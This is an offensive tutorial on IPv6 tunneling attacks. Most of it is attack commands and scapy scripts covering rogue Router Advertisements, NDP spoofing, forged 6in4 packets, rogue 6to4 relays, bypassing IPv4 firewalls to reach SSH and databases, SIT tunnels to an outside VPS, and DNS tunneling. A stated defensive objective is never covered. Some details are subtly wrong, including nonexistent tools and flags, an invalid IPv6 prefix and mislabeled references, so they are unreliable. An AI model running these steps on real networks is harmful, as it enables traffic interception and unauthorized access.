# IPv6 Tunneling Attack Guide

> Comprehensive guide to IPv6 tunneling attacks, including 6in4/6to4/Teredo tunnel exploitation, IPv6 reconnaissance techniques, and methods for bypassing IPv4-only firewalls using IPv6 protocol capabilities.

## Introduction

IPv6 adoption continues to accelerate, but many networks operate in dual-stack or transitional configurations that create security gaps between IPv4 and IPv6. These gaps are particularly exploitable through IPv6 tunneling techniques, where attackers leverage IPv6 protocol features and tunneling mechanisms to bypass IPv4-centric security controls.

The core vulnerability in many enterprise networks is the asymmetric security posture between IPv4 and IPv6. Firewalls, intrusion detection systems, and network monitoring tools are often meticulously configured for IPv4 traffic but have minimal or default configurations for IPv6. This creates a blind spot that attackers exploit by tunneling traffic over IPv6 to bypass IPv4 security controls, or by exploiting IPv6 transition mechanisms that are enabled but not monitored.

IPv6 tunneling attacks fall into three categories: exploiting configured tunnel mechanisms (6in4, 6to4, ISATAP), abusing automatic tunneling protocols (Teredo, 6over4), and leveraging native IPv6 capabilities that bypass IPv4-centric security (Router Advertisements, NDP spoofing). Each category requires different tools and techniques but shares the common goal of reaching network resources that IPv4 security controls would otherwise block.

**Learning objectives**:

- Understand IPv6 transition mechanisms and their security implications
- Perform IPv6 reconnaissance to discover dual-stack hosts and tunnel endpoints
- Exploit 6in4, 6to4, and Teredo tunnels for unauthorized network access
- Use IPv6 Router Advertisements and NDP spoofing to intercept traffic
- Bypass IPv4-only firewalls using IPv6 protocol capabilities
- Detect and defend against IPv6 tunneling attacks

**Prerequisites**: Understanding of IPv6 addressing, ICMPv6, and basic networking concepts. Familiarity with Linux network configuration. Access to a dual-stack network lab environment.

---

## Practical Steps

### Step 1: IPv6 Network Reconnaissance

Before exploiting IPv6 tunneling, discover what IPv6 capabilities exist on the target network. Many networks have IPv6 enabled at the host level even when IPv6 infrastructure is not formally deployed.

**Local IPv6 Discovery**

```bash
# Check local IPv6 addresses and interfaces
ip -6 addr show
ifconfig -a | grep -A 3 "inet6"

# Check for link-local addresses (fe80::/10)
ip -6 addr show scope link

# Check for IPv6 routes
ip -6 route show

# Check if IPv6 is enabled on the system
cat /proc/sys/net/ipv6/conf/all/disable_ipv6
# 0 = IPv6 enabled, 1 = IPv6 disabled

# Check listening IPv6 sockets
ss -6 -tlnp
```

**Network-Scope IPv6 Discovery**

```bash
# Discover IPv6 hosts on the local link using multicast
ping6 -I eth0 ff02::1
# This pings the all-nodes multicast group; responses reveal link-local hosts

# Capture Neighbor Discovery Protocol (NDP) traffic
tcpdump -i eth0 -nn icmp6

# Use nmap for IPv6 scanning (requires target address)
nmap -6 -sV -p 22,80,443,8080 fe80::1%eth0

# Passive IPv6 host discovery via NDP table
ip -6 neigh show

# Discover IPv6 routers via Router Solicitation
rdisc6 eth0
```

**Active IPv6 Host Enumeration**

```bash
# Scan a IPv6 subnet (challenging due to large address space)
# Use alive6 from THC-IPv6 toolkit
alive6 eth0

# Dictionary-based IPv6 address scanning
# Common patterns: ::1, ::ffff, ::dead, ::c0de
for suffix in 1 2 3 4 5 6 7 8 9 a b c d e f; do
  ping6 -c 1 -W 1 fe80::${suffix}%eth0 2>/dev/null && echo "Found: fe80::${suffix}"
done

# Use ipv6toolkit for comprehensive scanning
ipv6toolkit -i eth0 -l local_scan.log

# Discover SLAAC addresses using predictable patterns
# Linux EUI-64 format: derive from MAC address
# MAC: 00:11:22:33:44:55 -> EUI-64: 0211:22ff:fe33:4455
```

### Step 2: Exploiting 6in4 Configured Tunnels

6in4 tunnels encapsulate IPv6 packets inside IPv4 by prepending a IPv4 header with protocol type 41. These are explicitly configured tunnels often used for connecting IPv6 islands across IPv4 infrastructure.

**Discovering 6in4 Tunnel Endpoints**

```bash
# Scan for protocol 41 (IPv6-in-IPv4) traffic
tcpdump -i eth0 -nn proto 41

# Nmap scan for tunnel endpoints (protocol 41)
nmap -sO -p 41 target_network/24

# Check if the local host has configured 6in4 tunnels
ip tunnel show
ip -6 route show | grep "::/0 via"

# Look for tunnel interfaces
ip link show | grep -i tun
ls /etc/network/interfaces.d/ | grep -i tun
```

**Intercepting and Manipulating 6in4 Traffic**

```bash
# MITM attack on 6in4 tunnel using scapy
# Craft malicious IPv6-in-IPv4 packets
python3 << 'EOF'
from scapy.all import *
from scapy.layers.inet6 import IPv6

# Forge a 6in4 packet
ipv4_header = IP(src="192.168.1.100", dst="192.168.1.1", proto=41)
ipv6_header = IPv6(src="2001:db8::1", dst="2001:db8::2")
payload = TCP(dport=80, flags="S") / Raw(load="GET / HTTP/1.1\r\n\r\n")

packet = ipv4_header / ipv6_header / payload
send(packet)
EOF

# Capture and analyze 6in4 tunnel traffic
tcpdump -i any -w 6in4_capture.pcap 'proto 41'
tshark -r 6in4_capture.pcap -Y "ipv6" -V
```

**Exploiting Misconfigured Tunnel Endpoints**

```bash
# If tunnel endpoint accepts traffic from any source
# Inject IPv6 traffic through the tunnel gateway
# Step 1: Create a 6in4 tunnel interface
sudo ip tunnel add tun6 mode sit remote 192.168.1.1 local 192.168.1.100 ttl 64
sudo ip link set tun6 up
sudo ip -6 addr add 2001:db8::100/64 dev tun6
sudo ip -6 route add 2001:db8::/64 dev tun6

# Step 2: Scan the IPv6 network behind the tunnel
nmap -6 -sT 2001:db8::/120 -p 22,80,443

# Step 3: If routing is permitted, reach internal IPv6 hosts
curl -6 http://[2001:db8::10]/
ssh user@2001:db8::10
```

### Step 3: 6to4 Automatic Tunnel Exploitation

6to4 is an automatic tunneling mechanism that assigns IPv6 addresses based on the IPv4 address (2002:V4ADDR::/48) and uses relay routers at 192.88.99.1 (anycast). Misconfigured 6to4 can expose internal IPv6 traffic to interception.

**6to4 Discovery and Assessment**

```bash
# Check if 6to4 relay is reachable
ping 192.88.99.1

# Check for 6to4 tunnel interfaces
ip tunnel show | grep sit
ip -6 addr show | grep "2002:"

# Create a 6to4 tunnel for testing
# Compute 6to4 prefix from public IPv4 address
# Example: 203.0.113.50 -> hex: cb00:7132 -> 2002:cb00:7132::/48
PUBLIC_V4="203.0.113.50"
HEX=$(printf '%02x%02x:%02x%02x' $(echo $PUBLIC_V4 | tr '.' ' '))
echo "6to4 prefix: 2002:${HEX}::/48"

# Set up 6to4 tunnel
sudo ip tunnel add 6to4 mode sit remote any local $PUBLIC_V4 ttl 64
sudo ip link set 6to4 up
sudo ip -6 addr add 2002:${HEX}::1/16 dev 6to4
sudo ip -6 route add 2002::/16 dev 6to4
sudo ip -6 route add ::/0 via ::192.88.99.1 dev 6to4
```

**6to4 Traffic Interception**

```bash
# If positioned as a 6to4 relay, intercept tunnel traffic
# This requires being on the path between the 6to4 client and relay

# Capture 6to4 traffic (protocol 41 to/from relay)
tcpdump -i any -w 6to4.pcap 'host 192.88.99.1 and proto 41'

# Analyze encapsulated IPv6 traffic
tshark -r 6to4.pcap -Y "ipv6" -T fields -e ipv6.src -e ipv6.dst -e tcp.port 2>/dev/null

# Spoof a 6to4 relay to intercept tunnel traffic
# WARNING: This is for authorized testing only
# Requires being on the same LAN as the target
python3 << 'PYEOF'
from scapy.all import *

# Respond to 6to4 relay discovery as rogue relay
def handle_6to4(pkt):
    if pkt.haslayer(IP) and pkt[IP].proto == 41:
        # Extract inner IPv6 packet
        inner_ipv6 = pkt[IP].payload
        print(f"6to4 tunnel: {pkt[IP].src} -> {pkt[IP].dst}")
        print(f"  Inner IPv6: {inner_ipv6.src} -> {inner_ipv6.dst}")

sniff(filter="proto 41", prn=handle_6to4, store=0)
PYEOF
```

### Step 4: Teredo Tunnel Exploitation

Teredo tunnels IPv6 over UDP (port 3544), which can traverse NAT devices. Teredo clients communicate through Teredo servers and relays, creating potential interception points.

**Teredo Discovery and Assessment**

```bash
# Check for Teredo service (UDP port 3544)
nmap -sU -p 3544 target

# Detect Teredo traffic on the network
tcpdump -i any -nn udp port 3544 -w teredo.pcap

# Check if local system has Teredo configured
# Linux: miredo client
systemctl status miredo 2>/dev/null
ip -6 addr show | grep -i teredo

# Install and configure miredo for testing
sudo apt install miredo
sudo systemctl start miredo
ip -6 addr show dev teredo

# Test Teredo connectivity
ping6 -c 3 ipv6.google.com
curl -6 https://ipv6.google.com
```

**Teredo Security Assessment**

```bash
# Enumerate Teredo server and relay
# Teredo addresses contain server IPv4 in bytes 5-8
ip -6 addr show dev teredo | grep "inet6 2001:"
# Address format: 2001:0000:SERVER_V4:...

# Check if Teredo bypasses local firewall
# Compare IPv4 and IPv6 reachability
nmap -4 -p 22,80,443 target_ipv4
nmap -6 -p 22,80,443 target_teredo_addr

# Test if IPv6 traffic through Teredo is monitored by IDS/IPS
# Send test traffic that should trigger alerts
nmap -6 -sV -p 1-1000 target_teredo_addr

# Analyze Teredo encapsulation
tshark -r teredo.pcap -Y "udp.port == 3544" -V | head -100
```

### Step 5: IPv6 Router Advertisement Attacks

IPv6 uses Router Advertisements (RA) for automatic address configuration via SLAAC. Rogue RA attacks can redirect IPv6 traffic through an attacker-controlled machine, effectively creating a tunnel for traffic interception.

**Rogue Router Advertisement**

```bash
# Using THC-IPv6 toolkit to send rogue RA
# This makes the attacker the default IPv6 gateway
sudo sysctl -w net.ipv6.conf.all.forwarding=1

# Send Router Advertisements
sudo fakeroute6 -i eth0 -p 2001:db8:dead::/64

# Or use the more sophisticated approach with sysrcd6
sudo sysctl -w net.ipv6.conf.eth0.accept_ra=0

# Send rogue RA with THC-IPv6
sudo parasite6 eth0

# Alternative: use radvd for persistent rogue RA
cat > /tmp/radvd.conf << 'EOF'
interface eth0 {
    AdvSendAdvert on;
    MinRtrAdvInterval 3;
    MaxRtrAdvInterval 10;
    prefix 2001:db8:attacker::/64 {
        AdvOnLink on;
        AdvAutonomous on;
    };
};
EOF
sudo radvd -C /tmp/radvd.conf
```

**IPv6 Traffic Interception via Rogue RA**

```bash
# After becoming the rogue IPv6 gateway, intercept and forward traffic
# Enable IPv6 forwarding
sudo sysctl -w net.ipv6.conf.all.forwarding=1

# Set up NDP spoofing to intercept specific targets
# Using THC-IPv6:
sudo parasite6 -l eth0  # Intercept and forward all NDP traffic

# Or manually with scapy
python3 << 'PYEOF'
from scapy.all import *
from scapy.layers.inet6 import ICMPv6ND_NS, ICMPv6ND_NA, IPv6, ICMPv6NDOptDstLLAddr

def ndp_spoof(pkt):
    if pkt.haslayer(ICMPv6ND_NS):
        target = pkt[ICMPv6ND_NS].tgt
        src = pkt[IPv6].src
        # Send Neighbor Advertisement with our MAC
        na = IPv6(src=target, dst=src) / \
             ICMPv6ND_NA(R=0, S=1, O=1, tgt=target) / \
             ICMPv6NDOptDstLLAddr(lladdr=get_if_hwaddr("eth0"))
        sendp(Ether() / na, iface="eth0")
        print(f" NDP Spoof: {target} -> {src}")

sniff(filter="icmp6", prn=ndp_spoof, store=0, iface="eth0")
PYEOF
```

### Step 6: Bypassing IPv4 Firewalls with IPv6

The most common IPv6 tunneling attack exploits the gap between IPv4 and IPv6 security policies. When IPv4 firewalls block traffic but IPv6 is unmonitored, attackers can use IPv6 to reach the same services.

**Dual-Stack Firewall Bypass**

```bash
# Step 1: Identify dual-stack targets (hosts with both IPv4 and IPv6)
# Often web servers, DNS servers, and critical infrastructure have both
nmap -6 --script targets-ipv6-multicast-mac eth0

# Step 2: Compare IPv4 and IPv6 firewall policies
# Service blocked on IPv4 but accessible on IPv6?
# IPv4 test:
nmap -4 -p 22,80,443,3306,3389 192.168.1.100
# IPv6 test:
nmap -6 -p 22,80,443,3306,3389 2001:db8::100

# Step 3: If IPv6 is less restricted, use it for all access
ssh -6 user@2001:db8::100
mysql -h 2001:db8::100 -u root -p
curl -6 http://[2001:db8::100]:8080/

# Step 4: Use IPv6 to reach internal services through dual-stack hosts
# If a dual-stack host has IPv6 access to an internal service but IPv4 is firewalled:
ssh -6 -L 3306:[2001:db8::200]:3306 user@2001:db8::100
# Now: mysql -h 127.0.0.1 reaches the internal database via IPv6
```

**Protocol 41 (SIT) Tunnel for Firewall Bypass**

```bash
# If outbound IPv4 is filtered but protocol 41 is not inspected
# Create a SIT tunnel through the firewall

# On external server (VPS):
sudo ip tunnel add sit1 mode sit remote <target_public_ip> local <vps_ip> ttl 64
sudo ip link set sit1 up
sudo ip -6 addr add fd00::1/64 dev sit1

# On internal host (through the tunnel):
sudo ip tunnel add sit1 mode sit remote <vps_ip> local <internal_ip> ttl 64
sudo ip link set sit1 up
sudo ip -6 addr add fd00::2/64 dev sit1
sudo ip -6 route add ::/0 dev sit1

# Traffic now flows as protocol 41, bypassing IPv4 TCP/UDP inspection
```

### Step 7: DNS-Based IPv6 Tunneling

DNS queries can carry IPv6 addresses and tunnel data. This technique works even when only DNS is allowed outbound.

```bash
# Use iodine for DNS-based IPv6 tunneling
# Server (authoritative DNS for tunnel.example.com):
iodined -f -c -P secret123 2001:db8:bad::/64 tunnel.example.com

# Client:
iodine -f -P secret123 dns.server.ip tunnel.example.com

# After establishing the DNS tunnel, you have a point-to-point IPv6 connection
ip -6 addr show dns0
# Use the tunnel for IPv6 connectivity
ping6 2001:db8:bad::1
ssh -6 user@2001:db8:bad::1
```

---

## Hands-on Exercises

### Exercise 1: IPv6 Network Reconnaissance

**Scenario**: You have gained access to a Linux workstation on a corporate network. Determine if IPv6 is enabled and discover IPv6 hosts.

1. Check if IPv6 is enabled on the workstation
2. Identify all IPv6 addresses assigned to interfaces
3. Ping the all-nodes multicast group to discover link-local hosts
4. Check the NDP cache for discovered neighbors
5. Attempt to scan discovered IPv6 hosts for open services
6. Compare the IPv6 services found with what is accessible via IPv4

**Expected outcome**: A complete map of IPv6-capable hosts on the local link, including their link-local and global unicast addresses. Identification of services that are accessible via IPv6 but blocked via IPv4.

### Exercise 2: Rogue Router Advertisement Attack

**Scenario**: A target network uses SLAAC for IPv6 address configuration but has no IPv6 security monitoring. Demonstrate the impact of a rogue RA attack.

1. Enable IPv6 forwarding on your attack machine
2. Send Router Advertisements advertising a malicious prefix
3. Verify that target hosts configure addresses from your prefix
4. Configure yourself as the default IPv6 gateway
5. Intercept and forward DNS queries from target hosts
6. Demonstrate traffic interception by capturing HTTP requests

**Expected outcome**: Target hosts auto-configure IPv6 addresses from the attacker's prefix. DNS queries are redirected to an attacker-controlled DNS server. HTTP traffic is intercepted before being forwarded to the real destination.

### Exercise 3: IPv4 Firewall Bypass via IPv6

**Scenario**: An IPv4 firewall blocks SSH and database access to a critical server (192.168.50.10), but the server is dual-stack with IPv6 address 2001:db8:50::10. The IPv6 firewall has no rules.

1. Verify that SSH is blocked on IPv4 (connection refused/timeout)
2. Test SSH connectivity via IPv6 address
3. Set up an IPv6 SSH tunnel to forward a local port to the database service
4. Connect to the database through the IPv6 tunnel
5. Document the security gap between IPv4 and IPv6 policies

**Expected outcome**: Successful SSH connection and database access via IPv6 that was blocked via IPv4. A report documenting the asymmetric firewall configuration as a critical finding.

---

## References

1. **RFC 4213 - Basic Transition Mechanisms for IPv6 Hosts and Routers**: https://tools.ietf.org/html/rfc4213 -- 6in4 configured tunnels and dual-stack operation
2. **RFC 3056 - Connection of IPv6 Domains via IPv4 Clouds (6to4)**: https://tools.ietf.org/html/rfc3056 -- Automatic 6to4 tunneling specification
3. **RFC 4380 - Teredo: Tunneling IPv6 over UDP through NATs**: https://tools.ietf.org/html/rfc4380 -- Teredo tunneling protocol
4. **THC-IPv6 Toolkit**: https://github.com/vanhauser-thc/thc-ipv6 -- Comprehensive IPv6 attack toolkit
5. **MITRE ATT&CK T1190 - IPv6 Exploitation**: https://attack.mitre.org/techniques/T1190/ -- IPv6 attack surface
6. **NIST SP 800-119 - Guidelines for the Secure Deployment of IPv6**: https://csrc.nist.gov/publications/detail/sp/800-119/final -- IPv6 security guidelines
7. **IPv6 Toolkit (SI6 Networks)**: https://github.com/NLnetLabs/ipv6toolkit -- IPv6 security assessment toolkit
8. **HackTricks - IPv6 Pentesting**: https://book.hacktricks.xyz/pentesting/pentesting-ipv6 -- IPv6 pentest techniques
9. **SANS - IPv6 Attack Detection**: https://www.sans.org/white-papers/ipv6-attack-detection/ -- Defensive perspective on IPv6 attacks
